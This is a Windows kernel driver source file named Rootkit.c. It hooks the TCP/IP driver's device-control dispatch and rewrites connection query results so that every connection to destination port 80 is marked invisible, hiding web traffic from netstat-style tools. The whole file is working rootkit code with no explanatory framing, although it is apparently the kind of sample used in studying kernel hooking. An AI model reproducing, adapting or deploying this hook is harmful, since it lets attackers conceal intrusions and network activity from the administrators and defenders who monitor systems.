///////////////////////////////////////////////////////////////////////////////////////
// Filename Rootkit.c
// 
// Author: Jamie Butler
// Email:  james.butler@hbgary.com or butlerjr@acm.org
//
// Description: This is where the work gets done.
//
// Version: 1.0
// 

#include "ntddk.h"
#include "tdiinfo.h"
//#include "stdio.h"
//#include "stdlib.h"

#include "Rootkit.h"
   
NTSTATUS DriverEntry(
				   IN PDRIVER_OBJECT  DriverObject,
				   IN PUNICODE_STRING RegistryPath
					)
{
	
    NTSTATUS                ntStatus;

	OldIrpMjDeviceControl = NULL;

    DriverObject->DriverUnload = RootkitUnload;
	
	ntStatus = InstallTCPDriverHook();
	if(!NT_SUCCESS(ntStatus)) 
		return ntStatus;

	return STATUS_SUCCESS;
}


NTSTATUS InstallTCPDriverHook()
{
    NTSTATUS       ntStatus;
//  UNICODE_STRING deviceNameUnicodeString;
//  UNICODE_STRING deviceLinkUnicodeString;        
	UNICODE_STRING deviceTCPUnicodeString;
	WCHAR deviceTCPNameBuffer[]  = L"\\Device\\Tcp";
    pFile_tcp  = NULL;
	pDev_tcp   = NULL;
	pDrv_tcpip = NULL;

	RtlInitUnicodeString (&deviceTCPUnicodeString, deviceTCPNameBuffer);
	ntStatus = IoGetDeviceObjectPointer(&deviceTCPUnicodeString, FILE_READ_DATA, &pFile_tcp, &pDev_tcp);
	if(!NT_SUCCESS(ntStatus)) 
		return ntStatus;
	pDrv_tcpip = pDev_tcp->DriverObject;

	OldIrpMjDeviceControl = pDrv_tcpip->MajorFunction[IRP_MJ_DEVICE_CONTROL]; 
	if (OldIrpMjDeviceControl)
		InterlockedExchange ((PLONG)&pDrv_tcpip->MajorFunction[IRP_MJ_DEVICE_CONTROL], (LONG)HookedDeviceControl);
	
	return STATUS_SUCCESS;
}


NTSTATUS HookedDeviceControl(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
    PIO_STACK_LOCATION      irpStack;
    ULONG                   ioTransferType;
	TDIObjectID             *inputBuffer;
	DWORD					context;

	//DbgPrint("The current IRP is at %x\n", Irp);

    // Get a pointer to the current location in the Irp. This is where
    // the function codes and parameters are located.
    irpStack = IoGetCurrentIrpStackLocation (Irp);

    switch (irpStack->MajorFunction) 
	{
	    case IRP_MJ_DEVICE_CONTROL:
			if ((irpStack->MinorFunction == 0) && \
				(irpStack->Parameters.DeviceIoControl.IoControlCode == IOCTL_TCP_QUERY_INFORMATION_EX))
			{
				ioTransferType = irpStack->Parameters.DeviceIoControl.IoControlCode;
				ioTransferType &= 3;
				if (ioTransferType == METHOD_NEITHER) // Need to know the method to find input buffer
				{
					inputBuffer = (TDIObjectID *) irpStack->Parameters.DeviceIoControl.Type3InputBuffer;
					
					// CO_TL_ENTITY is for TCP and CL_TL_ENTITY is for UDP
					if (inputBuffer->toi_entity.tei_entity == CO_TL_ENTITY)
					{ 
						// DbgPrint("Input buffer %x\n",inputBuffer);
						if ((inputBuffer->toi_id == 0x101) || (inputBuffer->toi_id == 0x102) || (inputBuffer->toi_id == 0x110))
						{
							// Call our completion routine if IRP successful
							irpStack->Control = 0;
							irpStack->Control |= SL_INVOKE_ON_SUCCESS; 

							// Save old completion routine if present
							irpStack->Context = (PIO_COMPLETION_ROUTINE) ExAllocatePool(NonPagedPool, sizeof(REQINFO));

							((PREQINFO)irpStack->Context)->OldCompletion = irpStack->CompletionRoutine; 
							((PREQINFO)irpStack->Context)->ReqType       = inputBuffer->toi_id;

							// Setup our function to be called on completion of IRP
							irpStack->CompletionRoutine = (PIO_COMPLETION_ROUTINE)IoCompletionRoutine;
						}
					}
				}
			}
		break;
		
		default:
		break;
    }

    return OldIrpMjDeviceControl(DeviceObject, Irp);
}


NTSTATUS IoCompletionRoutine(IN PDEVICE_OBJECT DeviceObject, 
							 IN PIRP Irp, 
							 IN PVOID Context)
{
	PVOID OutputBuffer;
    DWORD NumOutputBuffers;
	PIO_COMPLETION_ROUTINE p_compRoutine;
	DWORD i;

	// Connection status values:
	// 0 = Invisible
	// 1 = CLOSED
	// 2 = LISTENING
	// 3 = SYN_SENT
	// 4 = SYN_RECEIVED
	// 5 = ESTABLISHED
	// 6 = FIN_WAIT_1
	// 7 = FIN_WAIT_2
	// 8 = CLOSE_WAIT
	// 9 = CLOSING
	// ...

	OutputBuffer = Irp->UserBuffer;
	p_compRoutine = ((PREQINFO)Context)->OldCompletion;

	if (((PREQINFO)Context)->ReqType == 0x101)
	{
		NumOutputBuffers = Irp->IoStatus.Information / sizeof(CONNINFO101);
		for(i = 0; i < NumOutputBuffers; i++)
		{
			// Hide all Web connections
			if (HTONS(((PCONNINFO101)OutputBuffer)[i].dst_port) == 80)
				((PCONNINFO101)OutputBuffer)[i].status = 0;
		}
	}
	else if (((PREQINFO)Context)->ReqType == 0x102)
	{
		NumOutputBuffers = Irp->IoStatus.Information / sizeof(CONNINFO102);
		for(i = 0; i < NumOutputBuffers; i++)
		{
			// Hide all Web connections
			if (HTONS(((PCONNINFO102)OutputBuffer)[i].dst_port) == 80)
				((PCONNINFO102)OutputBuffer)[i].status = 0;
		}
	}
	else if (((PREQINFO)Context)->ReqType == 0x110)
	{
		NumOutputBuffers = Irp->IoStatus.Information / sizeof(CONNINFO110);
		for(i = 0; i < NumOutputBuffers; i++)
		{
			// Hide all Web connections
			if (HTONS(((PCONNINFO110)OutputBuffer)[i].dst_port) == 80)
				((PCONNINFO110)OutputBuffer)[i].status = 0;
		}
	}

	ExFreePool(Context);

	/*
	for(i = 0; i < NumOutputBuffers; i++)
	{
		DbgPrint("Status: %d",OutputBuffer[i].status);
		DbgPrint(" %d.%d.%d.%d:%d",OutputBuffer[i].src_addr & 0xff,OutputBuffer[i].src_addr >> 8 & 0xff, OutputBuffer[i].src_addr >> 16 & 0xff,OutputBuffer[i].src_addr >> 24,HTONS(OutputBuffer[i].src_port));
		DbgPrint(" %d.%d.%d.%d:%d\n",OutputBuffer[i].dst_addr & 0xff,OutputBuffer[i].dst_addr >> 8 & 0xff, OutputBuffer[i].dst_addr >> 16 & 0xff,OutputBuffer[i].dst_addr >> 24,HTONS(OutputBuffer[i].dst_port));
	}*/

	if ((Irp->StackCount > (ULONG)1) && (p_compRoutine != NULL))
	{
		return (p_compRoutine)(DeviceObject, Irp, NULL);
	}
	else
	{
		return Irp->IoStatus.Status;
	}
}


NTSTATUS RootkitUnload(IN PDRIVER_OBJECT DriverObject)
{
	if (OldIrpMjDeviceControl)
		InterlockedExchange ((PLONG)&pDrv_tcpip->MajorFunction[IRP_MJ_DEVICE_CONTROL], (LONG)OldIrpMjDeviceControl);	
	if (pFile_tcp != NULL)
		ObDereferenceObject(pFile_tcp);
	pFile_tcp = NULL;

	return STATUS_SUCCESS;
}